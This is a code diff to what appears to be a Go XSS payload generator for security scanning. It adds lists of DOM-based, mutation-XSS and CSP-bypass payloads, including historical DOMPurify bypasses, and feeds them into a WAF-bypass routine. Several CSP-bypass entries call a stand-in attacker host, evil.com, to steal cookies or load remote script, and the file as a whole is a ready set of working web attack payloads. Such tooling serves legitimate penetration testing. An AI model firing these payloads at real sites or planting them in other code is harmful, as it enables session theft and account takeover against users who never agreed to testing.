@@ -45,6 +45,12 @@ func (g *Generator) GetPayloads(wafType string) []string {
 	payloads = append(payloads, g.getAwesomeConfirmVariants()...)
 	payloads = append(payloads, g.getAwesomeContextBreaking()...)
 
+	// Add DOM-based XSS payloads
+	payloads = append(payloads, g.getDOMXSSPayloads()...)
+
+	// Add Mutation XSS payloads (mXSS)
+	payloads = append(payloads, g.getMutationXSSPayloads()...)
+
 	// Add WAF-specific bypass payloads
 	switch strings.ToLower(wafType) {
 	case "cloudflare":
@@ -73,6 +79,7 @@ func (g *Generator) GetPayloads(wafType string) []string {
 		payloads = append(payloads, g.getSmartPayloads()...)
 		payloads = append(payloads, g.getPolyglotPayloads()...)
 		payloads = append(payloads, g.getAwesomePolyglots()...)
+		payloads = append(payloads, g.getCSPBypassPayloads()...)
 	}
 
 	return g.deduplicate(payloads)
@@ -429,6 +436,131 @@ func (g *Generator) getPolyglotPayloads() []string {
 
 		// HTML5 specific
 		`<math><maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(1)">CLICK`,
+	}
+}
+
+// getDOMXSSPayloads returns payloads specifically for DOM-based XSS
+func (g *Generator) getDOMXSSPayloads() []string {
+	return []string{
+		// Location-based DOM XSS
+		`javascript:alert(document.domain)`,
+		`javascript:alert(document.cookie)`,
+		`#<script>alert(1)</script>`,
+		`#<img src=x onerror=alert(1)>`,
+
+		// document.write payloads
+		`<img src=x onerror="document.write('<script>alert(1)</script>')">`,
+
+		// innerHTML payloads
+		`<div id=x></div><script>x.innerHTML='<img src=x onerror=alert(1)>'</script>`,
+
+		// jQuery-specific DOM XSS
+		`<img src=x onerror="$('body').append('<script>alert(1)</script>')">`,
+		`#<img src=x onerror=$.globalEval('alert(1)')>`,
+
+		// Prototype pollution based
+		`__proto__[innerHTML]=<img src=x onerror=alert(1)>`,
+		`constructor[prototype][innerHTML]=<img src=x onerror=alert(1)>`,
+
+		// postMessage based
+		`<script>window.postMessage('<img src=x onerror=alert(1)>','*')</script>`,
+
+		// Web Storage based
+		`<script>localStorage.setItem('xss','<img src=x onerror=alert(1)>');document.write(localStorage.getItem('xss'))</script>`,
+
+		// URL fragment payloads
+		`#"><script>alert(1)</script>`,
+		`#'><script>alert(1)</script>`,
+
+		// Angular-specific
+		`{{constructor.constructor('alert(1)')()}}`,
+		`{{$on.constructor('alert(1)')()}}`,
+
+		// Vue.js specific
+		`{{_c.constructor('alert(1)')()}}`,
+
+		// React-specific (dangerouslySetInnerHTML exploitation)
+		`<div dangerouslySetInnerHTML={{__html:'<img src=x onerror=alert(1)>'}}></div>`,
+	}
+}
+
+// getMutationXSSPayloads returns mutation-based XSS payloads (mXSS)
+func (g *Generator) getMutationXSSPayloads() []string {
+	return []string{
+		// Classic mXSS payloads that survive DOM sanitization
+		`<noscript><p title="</noscript><script>alert(1)</script>">`,
+		`<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>--></mglyph></table></mtext></math>`,
+		`<svg><style><img src=x onerror=alert(1)></style></svg>`,
+
+		// Backtick-based mXSS
+		"<img src=`x`onerror=alert(1)>",
+		"<svg><script>alert&#40;1)</script></svg>",
+
+		// Entity-based mXSS
+		`<svg><script>&#97;&#108;&#101;&#114;&#116;(1)</script></svg>`,
+
+		// Namespace confusion
+		`<svg><foreignObject><body onload=alert(1)></foreignObject></svg>`,
+		`<math><mtext><table><mglyph><style><![CDATA[</style><img src=x onerror=alert(1)>]]></mglyph></table></mtext></math>`,
+
+		// DOMPurify bypasses (historical)
+		`<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>`,
+		`<svg></p><style><g/onload=alert(1)>`,
+
+		// innerHTML mutation
+		`<img src="x` + "`" + `><script>alert(1)</script>">`,
+
+		// Comment-based mXSS
+		`<!--<img src="--><img src=x onerror=alert(1)//">`,
+		`<![CDATA[><script>alert(1)</script>]]>`,
+
+		// Attribute mutation
+		`<div id="x"><script>alert(1)//` + "`" + `"></div>`,
+	}
+}
+
+// getCSPBypassPayloads returns payloads that may bypass Content Security Policy
+func (g *Generator) getCSPBypassPayloads() []string {
+	return []string{
+		// JSONP-based bypasses (if allowed domains have JSONP)
+		`<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert"></script>`,
+
+		// Base tag injection for relative path hijacking
+		`<base href="https://evil.com/">`,
+
+		// Script gadgets in common libraries
+		`<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script><div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>`,
+
+		// data: URI exploits (if data: allowed)
+		`<script src="data:text/javascript,alert(1)"></script>`,
+
+		// Blob URL (if blob: allowed)
+		`<script>var b=new Blob(['alert(1)'],{type:'text/javascript'});var s=document.createElement('script');s.src=URL.createObjectURL(b);document.body.appendChild(s)</script>`,
+
+		// Worker-based execution
+		`<script>new Worker("data:text/javascript,postMessage(eval('alert(1)'))")</script>`,
+
+		// Object/Embed bypasses
+		`<object data="data:text/html,<script>alert(1)</script>">`,
+		`<embed src="data:text/html,<script>alert(1)</script>">`,
+
+		// SVG with inline script
+		`<svg><script xlink:href="data:,alert(1)"></script></svg>`,
+
+		// prefetch/preload exploitation
+		`<link rel="prefetch" href="https://evil.com/steal?cookie='+document.cookie">`,
+
+		// Meta refresh (for CSP-only headers without X-Frame-Options)
+		`<meta http-equiv="refresh" content="0;url=javascript:alert(1)">`,
+
+		// Style-based data exfiltration (CSS injection)
+		`<style>@import 'https://evil.com/steal.css';</style>`,
+
+		// Using allowed hosts for redirection
+		`<script src="/redirect?url=https://evil.com/evil.js"></script>`,
+
+		// WebRTC-based exfiltration
+		`<script>var pc=new RTCPeerConnection({iceServers:[{urls:"stun:evil.com"}]});pc.createDataChannel("");pc.createOffer().then(o=>pc.setLocalDescription(o))</script>`,
 	}
 }
 
